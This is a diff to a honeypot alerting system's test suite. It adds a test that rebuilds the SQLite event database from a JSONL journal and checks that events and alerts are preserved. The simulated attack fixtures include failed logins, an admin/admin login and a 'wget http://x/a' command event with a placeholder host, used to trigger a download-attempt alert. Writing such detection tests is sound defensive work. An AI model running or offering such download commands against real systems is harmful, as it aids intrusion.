@@ -13,6 +13,7 @@ from filters import (check_event, command_words, is_internal, build_alert, alert
 from events import validate_event
 from engine import Engine
 from storage import SqliteStorage, MemoryStorage
+import rebuild_db
 from scoring import score_to_severity
 from sessions import group_sessions, session_summary, STAGES
 from recommendations import DEFAULT_RECOMMENDATION
@@ -531,6 +532,57 @@ def test_sqlite_storage():
             storage.close()
 
 
+def test_rebuild_from_journal():
+    now = datetime(2026, 11, 27, 9, 0, tzinfo=timezone.utc)
+    attack = [failed_login("91.240.118.172", n, now + timedelta(seconds=n)) for n in range(6)]
+    wget = full(event_type="command_exec", when=now, payload_details={"command": "wget http://x/a",
+                                                                      "extracted_url": "http://x/a"})
+    late = full(ip="9.9.9.9", when=now + timedelta(minutes=1), event_id="late1",
+                credentials={"username": "admin", "password": "admin", "success": True})
+
+    with tempfile.TemporaryDirectory() as folder:
+        db = os.path.join(folder, "honeypot.db")
+        journal = os.path.join(folder, "received_events.jsonl")
+        storage = SqliteStorage(db, journal, os.path.join(folder, "rejected.jsonl"))
+        try:
+            engine = Engine(storage)
+            engine.ingest(attack[:3])
+            engine.ingest(attack[3:] + [wget])
+            try:   # un lot care pica: ajunge in jurnal, dar nu in baza...
+                storage.save([validate_event(late)[0]], [{"alert_id": "x", "event_id": "late1", "timestamp": late["timestamp"],
+                                                          "source_ip": "9.9.9.9", "rule": None, "score": 1, "severity": "LOW"}])
+            except sqlite3.IntegrityError:
+                pass
+            engine.ingest([late])   # ...si agentul il retrimite: in jurnal de doua ori
+            before_events = [r[0] for r in storage.conn.execute("SELECT event_id FROM events ORDER BY rowid")]
+            before_alerts = storage.conn.execute("SELECT alert_id, event_id, rule, score FROM alerts ORDER BY rowid").fetchall()
+        finally:
+            storage.close()
+        with open(journal, "a", encoding="utf-8") as f:
+            f.write("{o linie stricata\n")
+
+        with open(db + "-wal", "w") as f:   # ca dupa un crash: -wal are date, se muta cu baza
+            f.write("x")
+        old = rebuild_db.move_old(db)
+        assert not os.path.exists(db) and os.path.exists(old)
+        assert not os.path.exists(db + "-wal") and os.path.exists(old + "-wal")
+        os.remove(old + "-wal")   # nu e un WAL adevarat; fara el, baza veche ramane valida
+        journal_before = lines(journal)
+        stats = rebuild_db.rebuild(journal, db)
+        assert lines(journal) == journal_before   # jurnalul doar se citeste, nu se rescrie peste el insusi
+        assert stats == {"lines_ok": 9, "broken_lines": 1, "accepted": 8, "duplicates": 1, "rejected": 0, "alerts": 4}
+
+        storage = SqliteStorage(db, None, None)
+        try:   # aceleasi evenimente si aceleasi alerte, in aceeasi ordine
+            assert [r[0] for r in storage.conn.execute("SELECT event_id FROM events ORDER BY rowid")] == before_events
+            assert storage.conn.execute("SELECT alert_id, event_id, rule, score FROM alerts ORDER BY rowid").fetchall() \
+                == before_alerts
+            assert [rule for _, _, rule, _ in before_alerts] == ["critical_user_login", "brute_force",
+                                                                 "download_attempt", "login_success"]
+        finally:
+            storage.close()
+
+
 def storage_order(attack, tricky, other_format):
     """Ordinea in care engine-ul le-a salvat, cu event_id-urile date de validare."""
     return [validate_event(e)[0] for e in attack + [tricky, other_format]]
@@ -548,7 +600,7 @@ if __name__ == "__main__":
         test_command_injection_in_url, test_honeytoken_file_read, test_honeytoken_login_beats_brute_force,
         test_honeytoken_alerts_are_tagged, test_correlation_links_honeytoken_reader_and_user,
         test_session_keeps_usernames, test_honeytokens_match_the_agent, test_ready_for_the_database,
-        test_sqlite_storage,
+        test_sqlite_storage, test_rebuild_from_journal,
     ]
     for test in tests:
         test()
